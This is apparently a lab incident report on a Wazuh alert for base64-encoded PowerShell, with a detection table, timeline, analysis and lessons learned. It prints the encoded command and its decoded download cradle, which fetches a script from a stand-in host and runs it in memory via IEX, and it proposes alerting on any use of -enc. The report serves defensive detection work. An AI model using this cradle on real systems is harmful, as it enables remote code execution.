# IR-001 — PowerShell Encoded Command Execution

**Date:** 2026-10-17
**Analyst:** Naim Hariri
**Severity:** High (Level 12)
**MITRE Technique:** T1059.001 — Command and Scripting Interpreter: PowerShell
**Status:** Resolved

---

## 1. Executive Summary

A suspicious PowerShell process was detected executing a Base64-encoded command on endpoint DESKTOP-UHNGR5H. The encoded payload attempted to download and execute a remote script via `IEX (New-Object Net.WebClient).DownloadString()`. The connection failed due to an unresolvable hostname, preventing successful execution. Wazuh custom rule 100002 triggered on the `-enc` flag in the command line.

---

## 2. Detection

| Field | Value |
|-------|-------|
| Wazuh Rule | 100002 (custom) |
| Rule Description | T1059.001 - PowerShell encoded command execution detected |
| Sysmon Event ID | 1 (Process Create) |
| Alert Level | 12 |
| Timestamp | 2026-10-17 19:03:05 UTC |
| Endpoint | DESKTOP-UHNGR5H (10.0.2.15) |

**Command Line Detected:**
```
powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA...
```

**Decoded Payload:**
```
IEX (New-Object Net.WebClient).DownloadString('http://test.com')
```

---

## 3. Timeline

| Time (UTC) | Event |
|------------|-------|
| 19:03:05 | Sysmon Event ID 1 — powershell.exe spawned with -enc flag |
| 19:03:05 | Wazuh rule 100002 triggered |
| 19:03:05 | Connection attempt to test.com failed (DNS resolution error) |

---

## 4. Analysis

The attacker (or simulation) used PowerShell's `-EncodedCommand` (`-enc`) flag to obfuscate a download cradle. This is a common living-off-the-land technique used in phishing and post-exploitation to evade basic command-line logging. The payload attempted to:

1. Instantiate a `Net.WebClient` object
2. Download a remote script from `http://test.com`
3. Execute it in memory via `IEX` (Invoke-Expression)

The attack failed at step 2 due to DNS resolution failure. Had the C2 server been reachable, arbitrary code could have been executed in memory without touching disk.

---

## 5. Containment & Response

- No successful code execution occurred
- No lateral movement observed
- Endpoint isolated for review (simulation environment)
- Custom Wazuh rule 100002 confirmed detection capability

---

## 6. Lessons Learned

- Default Wazuh rules did not catch this — a custom rule was required, demonstrating the importance of tuning SIEM detection beyond out-of-the-box coverage
- Sysmon's process creation logging (Event ID 1) with command-line capture is essential for detecting encoded PowerShell
- Consider alerting on any use of `-enc` or `-EncodedCommand` regardless of payload content
